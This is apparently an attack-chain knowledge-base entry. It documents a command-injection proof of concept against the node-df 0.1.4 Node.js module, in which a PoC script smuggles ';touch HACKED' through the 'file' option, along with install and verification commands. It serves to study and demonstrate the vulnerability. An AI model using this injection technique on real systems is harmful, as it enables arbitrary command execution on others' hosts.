---
tags:
  - rce
  - command-injection
  - node-js
  - npm
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Vulnerable-node-df-Module]]'
  - '[[procedures/Verify-Initial-File-Absence]]'
  - '[[procedures/Create-and-Execute-PoC-Script]]'
  - '[[procedures/Verify-Exploitation-Success]]'
step_count: 4
techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:24.020Z'
description: >-
  Multi-stage attack chain exploiting command injection in the node-df module to
  achieve remote code execution on a Node.js environment.
skill_level: intermediate
impact_level: high
id: 79df6186-c8e9-49ec-9b15-b103b0fa7ce2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
---
# RCE via Command Injection in node-df Node.js Module

Multi-stage attack chain demonstrating exploitation of the node-df Node.js module (version 0.1.4) for remote code execution through insecure command concatenation. The vulnerability allows arbitrary shell command injection by passing unsanitized user input via the 'file' option, leading to full system compromise on the host.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Verify Initial State]
    B --> C[Execute PoC for Injection]
    C --> D[Verify Exploitation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]

### Target Environment

- Node.js runtime (version compatible with npm)
- Linux OS for shell command execution
- No specific services or ports required; local execution

### Initial Access Requirements

- Local access to a development environment with Node.js installed
- No network access or credentials needed; exploits local module usage

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-node-df-Module]]

**Objective**: Set up the vulnerable node-df module (version 0.1.4) in the local Node.js environment to enable exploitation.

**Instructions**: Use [[commands/npm-install-node-df]] to install the package:

```bash
npm i node-df@0.1.4
```

**Expected Output**: Installation logs confirming the package is added to node_modules and package.json.

**Success Indicators**:
- node-df directory appears in node_modules
- No errors during installation

### Step 2: Verify Initial State
procedure: [[procedures/Verify-Initial-File-Absence]]

**Objective**: Confirm the absence of the target file to establish a baseline before exploitation.

**Instructions**: Run [[commands/ls-check-files]] to list current directory contents:

```bash
ls
```

**Expected Output**: Directory listing without 'HACKED' file.

**Success Indicators**:
- No 'HACKED' file present
- Clean directory state confirmed

### Step 3: Execute PoC for Injection
procedure: [[procedures/Create-and-Execute-PoC-Script]]

**Objective**: Create and run a proof-of-concept script that injects a malicious command via the 'file' option, triggering RCE.

**Instructions**: First, create poc.js with the following content (manually or via editor):

```javascript
const df = require('node-df');
df('/', { file: '/;touch HACKED', prefixMultiplier: 'GB', isDisplayPrefixMultiplier: true, precision: 2 }, (error, response) => {
  if (error) throw error;
  console.log(JSON.stringify(response));
});
```

Then execute using [[commands/node-run-poc]]:

```bash
node poc.js
```

**Expected Output**: JSON disk usage output from df, with side-effect of 'HACKED' file creation.

**Success Indicators**:
- Script runs without errors
- JSON response printed to console

### Step 4: Verify Exploitation
procedure: [[procedures/Verify-Exploitation-Success]]

**Objective**: Confirm the injected command executed by checking for the created file.

**Instructions**: Re-run [[commands/ls-check-files]] to list directory:

```bash
ls
```

**Expected Output**: Directory listing now includes 'HACKED' file.

**Success Indicators**:
- 'HACKED' file appears
- Proof of command injection success

## Attack Chain Summary

### Key Achievements

1. Installed vulnerable module without detection
2. Injected and executed arbitrary shell command via Node.js script
3. Demonstrated RCE by file creation, indicating potential for full compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
